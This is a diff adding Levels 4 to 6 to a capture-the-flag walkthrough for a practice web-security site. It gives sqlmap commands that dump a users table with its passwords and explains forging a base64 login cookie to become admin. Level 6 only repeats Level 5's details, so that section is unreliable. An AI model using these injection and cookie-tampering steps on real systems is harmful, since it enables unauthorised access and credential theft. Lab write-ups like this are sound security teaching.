@@ -68,3 +68,55 @@ Password: nbusr123
 ```
 
 These credentials are an excellent reference to a time when our National Security Agency (NBU) was compromised because they were literally the credentials they were using at the time. And thanks to them, we just solved another level.
+
+### Level 4
+
+- Url: https://safeweb.aec.cz/level4.php?uid=1
+- Task: _Log in as the admin user_
+- Hint: _SQL Injection_
+
+Level #4 is the same login form but with a twist. The `uid` parameter fetches the username from the database and prefills the login input.
+
+![ctf_04.png](/assets/img/2024/07/ctf_04.png)
+
+We are looking at a classic SQL Injection here, and the best tool for this task is `sqlmap`. To do this, we can right-click on the GET request and use `Copy to file` in Burp. You can then use the request with `sqlmap` like this:
+```
+$ sqlmap --threads=10 -r sqli.txt --dbs
+$ sqlmap --threads=10 -r sqli.txt --tables -D testdb_2014_1
+$ sqlmap --threads=10 -r sqli.txt --columns -T users -D testdb_2014_1
+$ sqlmap --threads=10 -r sqli.txt --dump -T users -D testdb_2014_1
+
+Database: testdb_2014_1                                                                      
+Table: users
+[3 entries]
++----+-------+-------------+
+| id | login | password    |
++----+-------+-------------+
+| 1  | john  | Password    |
+| 2  | bob   | abc123      |
+| 0  | admin | asdfasdf123 |
++----+-------+-------------+
+```
+
+And just like that, we solved another level.
+
+### Level 5
+
+- Url: https://safeweb.aec.cz/level5.php
+- Task: _Log in as the admin user. Your user credentials are: guest/tajneheslo
+- Hint: _Cookies_
+
+This level is another login form, but now we have guest access. The goal is to escalate permissions to the admin using Cookies. After successful authentication, we can observe that a server response sets a `login` cookie.
+
+![ctf_05.png](/assets/img/2024/07/ctf_05.png)
+
+Send the authenticated GET request to Repeter, highlight the cookie value, and you will see that it is our `base64` encoded username. We can change the value to `admin`, resend the request, and solve the level.
+
+![ctf_06.png](/assets/img/2024/07/ctf_06.png)
+
+### Level 6
+
+- Url: https://safeweb.aec.cz/level5.php
+- Task: _Log in as the admin user. Your user credentials are: guest/tajneheslo
+- Hint: _Cookies_
+
